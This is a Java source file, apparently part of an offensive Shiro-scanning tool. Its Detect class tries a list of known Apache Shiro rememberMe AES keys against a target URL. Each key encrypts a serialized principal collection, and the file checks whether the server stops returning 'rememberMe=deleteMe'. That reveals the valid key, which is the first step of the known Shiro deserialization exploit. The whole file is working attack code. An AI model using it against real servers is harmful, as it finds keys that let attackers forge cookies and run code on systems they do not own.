package org.sec.core;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Detect implements Key {

    private static final Logger logger = LoggerFactory.getLogger(Detect.class);

    public static String start(OkHttpClient client,String url) throws Exception {
        for (String key : keys) {
            SimplePrincipalCollection sc = new SimplePrincipalCollection();
            byte[] scBytes = Payload.serialize(sc);
            byte[] keyBytes = Base64.decode(key);
            CipherService cipherService = new AesCipherService();
            ByteSource byteSource = cipherService.encrypt(scBytes, keyBytes);
            byte[] value = byteSource.getBytes();
            String checkKeyCookie = "rememberMe=" + Base64.encodeToString(value);
            Request loginReq = new Request.Builder()
                    .url(url)
                    .addHeader("Cookie", "rememberMe=4ra1n")
                    .get()
                    .build();
            Call call = client.newCall(loginReq);
            Response response = call.execute();
            String respCookie = response.header("Set-Cookie");
            boolean shiro = false;
            if (respCookie != null && !respCookie.equals("")) {
                if (respCookie.contains("rememberMe=deleteMe")) {
                    Request checkReq = new Request.Builder()
                            .url(url)
                            .addHeader("Cookie", checkKeyCookie)
                            .get()
                            .build();
                    Call checkCall = client.newCall(checkReq);
                    Response checkResponse = checkCall.execute();
                    if (checkResponse.header("Set-Cookie") == null) {
                        shiro = true;
                        logger.info("find shiro key: " + key);
                    }
                    checkResponse.close();
                }
            }
            response.close();
            if (shiro) {
                return key;
            }
        }
        return null;
    }
}
